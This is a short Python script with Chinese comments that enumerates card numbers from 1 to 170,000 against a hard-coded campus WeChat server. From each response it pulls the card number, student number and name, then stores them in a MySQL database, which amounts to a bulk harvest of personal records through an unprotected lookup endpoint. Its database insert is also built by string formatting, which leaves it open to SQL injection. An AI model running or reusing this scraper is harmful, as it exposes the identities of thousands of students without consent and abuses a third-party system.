#!/usr/bin/python
# -*- coding: UTF-8 -*-


'''
获取在一卡通信息
18.5.12
辣鸡土豆
'''

def getsno(cardno):
    import urllib
    import urllib.request
    url="http://58.192.115.47:8088/wechat-campus/url/redirect.html?flag=1&sum=" + str(cardno)
    request = urllib.request.Request(url)
    response = urllib.request.urlopen(request)
    data = response.read()
    data=data.decode("utf8")
    import re
    pat=r'''<input type="hidden" name="json" value="(.*?)"/>'''
    ans=re.search(pat,data)
    #print(ans.groups()[0])

    import urllib.parse
    ans=urllib.parse.unquote(ans.groups()[0])
    #print(ans)
    import json
    jsob=json.loads(ans)
    #print(jsob["cardno"])
    #print(jsob["sno"])
    #print(jsob["name"])
    return jsob

def main():
    for cardno in range(1,170000):
        try:
            ans = getsno(cardno)
            savecardno(ans["cardno"],ans["sno"],ans["name"])
        except:
            pass

def savecardno(cardno,card,name):
    import pymysql
    # 打开数据库连接
    db = pymysql.connect("localhost", "root", "改成你的数据库密码", "你的库名",charset='utf8')

    # 使用 cursor() 方法创建一个游标对象 cursor
    cursor = db.cursor()

    sql="insert into cardno value ('%s','%s','%s');" % (cardno,card,name)
    print(sql)
    # 使用 execute()  方法执行 SQL 查询
    cursor.execute(sql)

    db.commit()
    # 关闭数据库连接
    db.close()

main()